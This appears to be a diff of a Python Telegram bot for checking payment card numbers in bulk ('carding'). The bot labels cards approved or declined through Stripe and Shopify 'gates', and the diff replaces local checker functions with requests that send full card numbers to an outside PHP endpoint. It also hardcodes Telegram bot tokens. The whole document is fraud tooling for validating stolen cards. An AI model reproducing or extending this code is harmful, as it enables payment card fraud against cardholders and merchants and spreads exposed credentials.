@@ -15,15 +15,15 @@ import asyncio
 #============ Api Import ==≠=====≠==
 
 from reg import reg
-from gate import Tele # chk and cchk
+
 from ppc import ppc # au and mass
 from Shopify import vbv # sh 
-from pikachu import Gele # ustxt
+
 
 
 
 # Replace this with your bot token
-API_TOKEN = "7567332983:AAEl1bMw5oYT0DeLtSOWbjcP55R_emYbVgM"
+API_TOKEN = "8041044656:AAEvLW5kJb-ULTER-oaXPN_oCz7EYyD-VPI"
 
 bot = telebot.TeleBot(API_TOKEN)
 
@@ -776,7 +776,7 @@ def cmd_mbin(message):
 from telebot import TeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import csv, re, time, threading, asyncio
-from pikachu import Gele
+
 
 
 # --- Load BIN Info from CSV ---
@@ -912,9 +912,16 @@ def process_cards(message, message_id, cards, user_id):
 
             start_time = time.time()
             try:
-                result = str(Gele(cc)) 
-            except Exception:
-                result = "Error"
+                response = requests.get(f"https://kamalxd.com/shopify/st.php?cc={cc}", timeout=10)
+                data = response.json()
+                status = data.get("status", "declined").lower()
+                if status == "approved":
+                    last = "approved"
+                else:
+                    last = data.get("response", "No response")
+            except Exception as e:
+                 last = "error"	
+                 		
             execution_time = time.time() - start_time
 
             # --- BIN INFO
@@ -1368,7 +1375,7 @@ def process_chk_command(message, processing_msg_id, cc):
     start_time = time.time()
 
     try:
-        last = str(Tele(cc))  # 🔁 Assumes Tele() is defined
+        last = "❌ Gate not available right now, please try again later." # 🔁 Assumes Tele() is defined
     except Exception as e:
         last = 'Error'
 
@@ -1493,11 +1500,18 @@ Use /help anytime for support.</b>'''
 def process_au_command(message, processing_msg_id, cc):
     gate = 'sᴛʀɪᴘᴇ ᴀᴜᴛʜ'
     start_time = time.time()
-
     try:
-        last = asyncio.run(ppc(cc))
-    except Exception:
-        last = 'Error'
+        response = requests.get(f"https://kamalxd.com/shopify/st.php?cc={cc}", timeout=10)
+        data = response.json()
+
+        status = data.get("status", "declined").lower()
+
+        if status == "approved":
+            last = "approved"
+        else:
+            last = data.get("response", "No response")
+    except Exception as e:
+        last = "error"
 
     bin_info = get_bin_info_from_csv(cc[:6])
     if bin_info:
@@ -1615,7 +1629,7 @@ def process_card_cchk(cc):
     # Simulate using Tele(cc) logic
     brand, card_type, country, flag, bank = get_card_info(cc)
     try:
-        result = str(Tele(cc))   # Replace with actual call to Tele(cc)
+        result = "❌ Gate not available right now, please try again later."   # Replace with actual call to Tele(cc)
     except:
         result = "Error"
 
@@ -1665,9 +1679,17 @@ def respond_to_cchk(message):
 def process_card_mass(cc):
     brand, card_type, country, flag, bank = get_card_info(cc)
     try:
-        result = str(asyncio.run(ppc(cc)))
-    except:
-        result = "Error"
+        response = requests.get(f"https://kamalxd.com/shopify/st.php?cc={cc}", timeout=10)
+        data = response.json()
+
+        status = data.get("status", "declined").lower()
+
+        if status == "approved":
+            result = "approved"
+        else:
+            result = data.get("response", "No response")
+    except Exception as e:
+        result = "error"
 
     status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if any(i in result.lower() for i in ["approved", "funds", "added", "purchase", "duplicate", " avs"]) else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
     return f"Card↯ <code>{cc}</code>\nStatus - {status}\nResult -⤿ {result} ⤾\n"
@@ -1710,5 +1732,5 @@ def respond_to_mass(message):
 
 
 print("Bot is running...")
-bot.remove_webhook()
+
 bot.infinity_polling()
